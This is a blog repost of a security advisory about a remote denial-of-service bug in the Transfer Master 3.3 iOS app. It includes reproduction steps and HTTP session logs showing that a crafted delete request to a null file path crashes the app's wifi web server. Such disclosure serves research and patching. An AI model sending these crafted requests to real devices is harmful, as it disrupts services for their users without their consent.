---
layout: post
title: Transfer Master 3.3
date: 2020-04-28 03:22 +0300
categories: [Exploits, Denial of Service (DoS)]
tags: [exploits]
---








![](../../../assets/img/Exploits/transfer.png)

A denial of service vulnerability is present in Transfer Master version 3.3 for iOS.

  

```
MD5 | bfb16346108d81a312ef921e89f0b550
```

```perl
    Document Title:
    ===============
    Transfer Master v3.3 iOS - Denial of Service Vulnerability
    
    
    References (Source):
    ====================
    https://www.vulnerability-lab.com/get_content.php?id=2224
    
    
    Release Date:
    =============
    2020-04-28
    
    
    Vulnerability Laboratory ID (VL-ID):
    ====================================
    2224
    
    
    Common Vulnerability Scoring System:
    ====================================
    4.2
    
    
    Vulnerability Class:
    ====================
    Denial of Service
    
    
    Current Estimated Price:
    ========================
    500€ - 1.000€
    
    
    Product & Service Introduction:
    ===============================
    Transfer Master - Transfer photo,video,file,contact and File manager.
    
    (Copy of the Homepage:
    https://apps.apple.com/us/app/transfer-master-transfer-photo-video-file-contact/id590196698
    )
    
    
    Abstract Advisory Information:
    ==============================
    The vulnerability laboratory core research team discovered a remote
    denial of service vulnerability in the Transfer Master v3.3 mobile ios
    web-application.
    
    
    Vulnerability Disclosure Timeline:
    ==================================
    2020-04-28: Public Disclosure (Vulnerability Laboratory)
    
    
    Discovery Status:
    =================
    Published
    
    
    Exploitation Technique:
    =======================
    Remote
    
    
    Severity Level:
    ===============
    Medium
    
    
    Authentication Type:
    ====================
    Pre auth - no privileges
    
    
    User Interaction:
    =================
    No User Interaction
    
    
    Disclosure Type:
    ================
    Independent Security Research
    
    
    Technical Details & Description:
    ================================
    A remote denial of service vulnerability has been discovered in the
    official Transfer Master v3.3 mobile ios web-application.
    
    The denial of service vulnerability is located in the delete post method
    request on the files path. Remote attackers can
    manipulate the ui by sending special crafted requests to cause a null
    pointer error that crashs the wifi web-server.
    The attacker changes the file delete request to a null path which
    results in a null pointer that crashs the application.
    
    Successful exploitation of the denial of service vulnerability results
    in a wifi web-server ui crash and freeze.
    
    
    Proof of Concept (PoC):
    =======================
    The denial of service vulnerability can be exploited by remote attackers
    with wifi network access without user interaction.
    For security demonstration or to reproduce the vulnerability follow the
    provided information and steps below to continue.
    
    
    Manual steps to reproduce the vulnerability ...
    1. Install and start the local ios app
    2. Open the wifi share option to start the web-server
    3. Move to the front ui
    4. Tamper the https session and reply by deleting the files path with
    (null) as empty quote
    5. The web-server crashs and the wifi ui becomes unavailable by a blank
    screen that responds with not found
    Note: Service still alive but finally unavailable cause of a null
    pointer issue
    6. Successful reproduce of the denial of service vulnerability!
    
    
    --- PoC Session Logs (POST/GET) ---
    http://localhost:8181/files//(null)
    Host: localhost:8181
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
    Gecko/20100101 Firefox/75.0
    Accept:
    text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded;charset=UTF-8
    Content-Length: 28
    Connection: keep-alive
    _method=delete&commit=Delete
    -
    POST: HTTP/1.1 302 Found
    Location: /
    Content-Type: text/html; charset=utf-8
    Content-Length: 67
    -
    http://localhost:8181/
    Host: localhost:8181
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
    Gecko/20100101 Firefox/75.0
    Accept:
    text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://localhost:8181/
    Connection: keep-alive
    - (Game Over)
    GET: HTTP/1.1 404 Not Found (Unavailable)
    Accept-Ranges: bytes
    Content-Length: 0
    
    
    Credits & Authors:
    ==================
    Vulnerability-Lab -
    https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
    Benjamin Kunz Mejri -
    https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
    
    
    Disclaimer & Information:
    =========================
    The information provided in this advisory is provided as it is without
    any warranty. Vulnerability Lab disclaims all warranties,
    either expressed or implied, including the warranties of merchantability
    and capability for a particular purpose. Vulnerability-Lab
    or its suppliers are not liable in any case of damage, including direct,
    indirect, incidental, consequential loss of business profits
    or special damages, even if Vulnerability-Lab or its suppliers have been
    advised of the possibility of such damages. Some states do
    not allow the exclusion or limitation of liability for consequential or
    incidental damages so the foregoing limitation may not apply.
    We do not approve or encourage anybody to break any licenses, policies,
    deface websites, hack into databases or trade with stolen data.
    
    Domains:    www.vulnerability-lab.com    www.vuln-lab.com
    www.vulnerability-db.com
    Services:   magazine.vulnerability-lab.com
    paste.vulnerability-db.com       infosec.vulnerability-db.com
    Social:      twitter.com/vuln_lab    facebook.com/VulnerabilityLab
    youtube.com/user/vulnerability0lab
    Feeds:      vulnerability-lab.com/rss/rss.php
    vulnerability-lab.com/rss/rss_upcoming.php
    vulnerability-lab.com/rss/rss_news.php
    Programs:   vulnerability-lab.com/submit.php
    vulnerability-lab.com/register.php
    vulnerability-lab.com/list-of-bug-bounty-programs.php
    
    Any modified copy or reproduction, including partially usages, of this
    file requires authorization from Vulnerability Laboratory.
    Permission to electronically redistribute this alert in its unmodified
    form is granted. All other rights, including the use of other
    media, are reserved by Vulnerability-Lab Research Team or its suppliers.
    All pictures, texts, advisories, source code, videos and other
    information on this website is trademark of vulnerability-lab team & the
    specific authors or managers. To record, list, modify, use or
    edit our material contact (admin@ or research@) to get a ask permission.
    
                Copyright © 2020 | Vulnerability Laboratory - [Evolution
    Security GmbH]™
    
    
    
    
    --
    VULNERABILITY LABORATORY - RESEARCH TEAM
    SERVICE: www.vulnerability-lab.com
```
{: .nolineno }

<br>

  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)